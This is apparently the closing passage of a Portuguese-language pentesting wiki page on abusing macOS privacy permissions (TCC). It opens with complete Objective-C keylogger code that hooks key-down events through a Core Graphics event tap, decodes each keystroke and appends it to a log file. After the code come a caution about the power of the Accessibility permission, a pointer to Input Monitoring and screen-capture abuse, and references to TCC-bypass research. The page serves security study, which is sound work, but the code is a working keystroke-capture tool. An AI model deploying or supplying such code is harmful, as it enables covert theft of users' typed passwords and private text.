const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

UInt32 deadKeyState = 0;
OSStatus status = UCKeyTranslate(keyboardLayout,
keyCode,
kUCKeyActionDown,
0,
LMGetKbdType(),
kUCKeyTranslateNoDeadKeysBit,
&deadKeyState,
maxStringLength,
&actualStringLength,
unicodeString);
CFRelease(currentKeyboard);

if (status == noErr && actualStringLength > 0) {
keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
} else {
keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
}
}

NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
AppendStringToFile(logString, kKeystrokesLogPath);
}
return event;
}

int main() {
@autoreleasepool {
CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

if (!eventTap) {
NSLog(@"Failed to create event tap");
exit(1);
}

CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
CGEventTapEnable(eventTap, true);
CFRunLoopRun();
}
return 0;
}
```
{{#endtab}}
{{#endtabs}}

> [!CAUTION] > **A Acessibilidade é uma permissão muito poderosa**, você poderia abusar dela de outras formas; por exemplo, poderia realizar o **keystrokes attack** somente a partir dela, sem precisar chamar o System Events.

> [!TIP]
> Versões mais recentes do macOS também dividem o abuso da sessão da área de trabalho entre **Input Monitoring** (`kTCCServiceListenEvent`) e **synthetic input** (`kTCCServicePostEvent`). Se você precisar de keylogging, capturas de tela ou injeção de eventos brutos em vez de automação com AXUIElement, consulte [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).

## References

- [1] [Cisco Talos - Como múltiplas vulnerabilidades em aplicativos da Microsoft para macOS abrem caminho para o roubo de permissões](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
- [2] [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
- [3] [Apple Developer - Solicitando autorização para captura de mídia no macOS](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
- [4] [Apple Developer - Capturar conteúdo HDR com ScreenCaptureKit (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
- [5] [vsociety - CVE-2023-26818: Bypass do TCC do MacOS com Telegram usando injeção de DyLib Parte 1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
- [6] [Vicarius vsociety - CVE-2023-26818: Explorar o bypass do TCC do macOS com o Telegram (Parte 1)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
{{#include ../../../../banners/hacktricks-training.md}}
